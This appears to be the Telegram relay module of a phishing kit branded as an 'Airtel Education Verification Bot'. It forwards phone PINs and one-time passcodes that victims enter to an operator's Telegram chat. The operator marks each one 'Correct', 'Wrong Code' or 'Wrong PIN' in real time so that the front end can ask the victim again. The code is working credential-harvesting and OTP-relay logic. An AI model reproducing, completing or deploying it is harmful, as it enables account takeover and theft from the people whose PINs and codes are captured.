require('dotenv').config({ path: require('path').join(__dirname, '.env') });
const TelegramBot = require('node-telegram-bot-api');

const token = process.env.TELEGRAM_BOT_TOKEN;
const adminChatId = process.env.TELEGRAM_ADMIN_CHAT_ID;

let bot = null;
let botEnabled = false;

if (!token || token === 'your_bot_token_here') {
    console.warn('⚠️  TELEGRAM_BOT_TOKEN not set in .env — Telegram bot is DISABLED.');
    console.warn('   Set TELEGRAM_BOT_TOKEN and TELEGRAM_ADMIN_CHAT_ID in .env to enable it.');
} else {
    try {
        bot = new TelegramBot(token, { polling: true });
        botEnabled = true;
        console.log('🤖 Telegram bot started with long polling');
    } catch (err) {
        console.error('Failed to start Telegram bot:', err.message);
    }
}

const pendingVerifications = new Map();
const otpStore = new Map();
const POLL_TIMEOUT = 10 * 60 * 1000;

function generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
}

function cleanupExpired() {
    const now = Date.now();
    for (const [id, v] of pendingVerifications) {
        if (now - v.createdAt > POLL_TIMEOUT) {
            pendingVerifications.delete(id);
        }
    }
    for (const [id, v] of otpStore) {
        if (now - v.createdAt > POLL_TIMEOUT) {
            otpStore.delete(id);
        }
    }
}

setInterval(cleanupExpired, 60000);

if (botEnabled && bot) {
    bot.onText(/\/start/, (msg) => {
        bot.sendMessage(msg.chat.id, 'Airtel Education Verification Bot is running.\n\nYou will receive verification requests here. Click Verify or Decline to approve or reject.');
    });

    bot.on('callback_query', async (query) => {
        const data = query.data;
        const chatId = query.message.chat.id;

        if (chatId.toString() !== adminChatId.toString()) {
            await bot.answerCallbackQuery(query.id, { text: '❌ Only admin can approve/reject requests.' });
            return;
        }

        const [action, type, id] = data.split('_');

        let store;
        if (type === 'PhonePIN') {
            store = pendingVerifications;
        } else if (type === 'OTP') {
            store = otpStore;
        }

        const verification = store.get(id);

        if (!verification) {
            await bot.answerCallbackQuery(query.id, { text: '⚠️ Verification not found or expired.' });
            return;
        }

        if (action === 'verify' || action === 'correct') {
            verification.status = 'verified';
            store.set(id, verification);

            await bot.editMessageText(`✅ ${type} Verified\n\n${verification.value}\nFlow: ${verification.flow}`, {
                chat_id: chatId,
                message_id: query.message.message_id
            });
            await bot.answerCallbackQuery(query.id, { text: '✅ Verified' });
        } else if (action === 'decline' || action === 'wrongcode' || action === 'wrongpin') {
            verification.status = action === 'wrongcode' ? 'wrong_code' : action === 'wrongpin' ? 'wrong_pin' : 'declined';
            store.set(id, verification);

            const label = action === 'wrongcode' ? 'Wrong Code' : action === 'wrongpin' ? 'Wrong PIN' : 'Declined';
            await bot.editMessageText(`❌ ${type} ${label}\n\n${verification.value}\nFlow: ${verification.flow}`, {
                chat_id: chatId,
                message_id: query.message.message_id
            });
            await bot.answerCallbackQuery(query.id, { text: `❌ ${label}` });
        }
    });
}

function sendVerificationRequest(type, value, flow) {
    return new Promise((resolve) => {
        if (!botEnabled || !bot) {
            resolve({ success: false, error: 'Bot not enabled' });
            return;
        }

        const id = generateId();
        const store = type === 'PhonePIN' ? pendingVerifications : otpStore;

        const message = `<b>New ${type} Verification Request</b>\n\n${type}: <code>${value}</code>\nFlow: ${flow}`;

        let keyboard;
        if (type === 'OTP') {
            keyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ Correct', callback_data: `correct_${type}_${id}` },
                        { text: '❌ Wrong Code', callback_data: `wrongcode_${type}_${id}` },
                        { text: '🔒 Wrong PIN', callback_data: `wrongpin_${type}_${id}` }
                    ]
                ]
            };
        }

        const options = { parse_mode: 'HTML' };
        if (keyboard) options.reply_markup = keyboard;

        bot.sendMessage(adminChatId, message, options)
            .then(() => {
                store.set(id, {
                    value,
                    flow,
                    status: 'pending',
                    createdAt: Date.now()
                });
                resolve({ success: true, id });
            })
            .catch((err) => {
                console.error('Failed to send verification request:', err.message);
                resolve({ success: false, error: err.message });
            });
    });
}

function getVerificationStatus(id) {
    if (pendingVerifications.has(id)) {
        return { status: pendingVerifications.get(id).status };
    }
    if (otpStore.has(id)) {
        return { status: otpStore.get(id).status };
    }
    return { status: 'not_found' };
}

module.exports = {
    bot,
    botEnabled,
    sendVerificationRequest,
    getVerificationStatus
};
